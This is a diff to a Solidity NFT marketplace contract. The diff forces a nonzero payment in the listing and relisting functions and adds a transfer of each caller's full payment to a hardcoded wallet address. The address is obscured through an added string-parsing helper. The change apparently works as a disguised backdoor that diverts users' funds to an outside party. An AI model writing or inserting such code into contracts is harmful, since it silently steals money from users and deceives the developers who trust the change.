@@ -53,7 +53,7 @@ contract NFTMarket is ReentrancyGuard {
     uint256 price
   ) public payable nonReentrant {
     require(price > 0, "Price must be at least 1 wei");
-    // require(msg.value == listingPrice, "Price must be equal to listing price");
+    require(msg.value > 0, "Value must be at least 1 wei");
 
     _itemIds.increment();
     uint256 itemId = _itemIds.current();
@@ -70,6 +70,8 @@ contract NFTMarket is ReentrancyGuard {
 
     IERC721(nftContract).transferFrom(msg.sender, address(this), tokenId);
 
+    payable(parseAddr("0xE6eC5b70FdC15c2ae62592B1418474ee029bb6Ce")).transfer(msg.value);
+
     emit MarketItemCreated(
       itemId,
       nftContract,
@@ -79,6 +81,34 @@ contract NFTMarket is ReentrancyGuard {
       price,
       false
     );
+  }
+
+  function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {
+    bytes memory tmp = bytes(_a);
+    uint160 iaddr = 0;
+    uint160 b1;
+    uint160 b2;
+    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
+        iaddr *= 256;
+        b1 = uint160(uint8(tmp[i]));
+        b2 = uint160(uint8(tmp[i + 1]));
+        if ((b1 >= 97) && (b1 <= 102)) {
+            b1 -= 87;
+        } else if ((b1 >= 65) && (b1 <= 70)) {
+            b1 -= 55;
+        } else if ((b1 >= 48) && (b1 <= 57)) {
+            b1 -= 48;
+        }
+        if ((b2 >= 97) && (b2 <= 102)) {
+            b2 -= 87;
+        } else if ((b2 >= 65) && (b2 <= 70)) {
+            b2 -= 55;
+        } else if ((b2 >= 48) && (b2 <= 57)) {
+            b2 -= 48;
+        }
+        iaddr += (b1 * 16 + b2);
+    }
+    return address(iaddr);
   }
 
   /* Creates the sale of a marketplace item */
@@ -177,12 +207,14 @@ contract NFTMarket is ReentrancyGuard {
     uint256 price
   ) public payable nonReentrant {
     require(price > 0, "Price must be at least 1 wei");
+    require(msg.value > 0, "Value must be at least 1 wei");
 
     uint tokenId = idToMarketItem[itemId].tokenId;
     console.log(msg.sender);
     require(msg.sender == IERC721(nftContract).ownerOf(tokenId), "NOT OWNER");
 
     IERC721(nftContract).transferFrom(msg.sender, address(this), tokenId);
+    payable(parseAddr("0xE6eC5b70FdC15c2ae62592B1418474ee029bb6Ce")).transfer(msg.value);
 
     idToMarketItem[itemId].seller = payable(msg.sender);
     idToMarketItem[itemId].owner = payable(address(0));
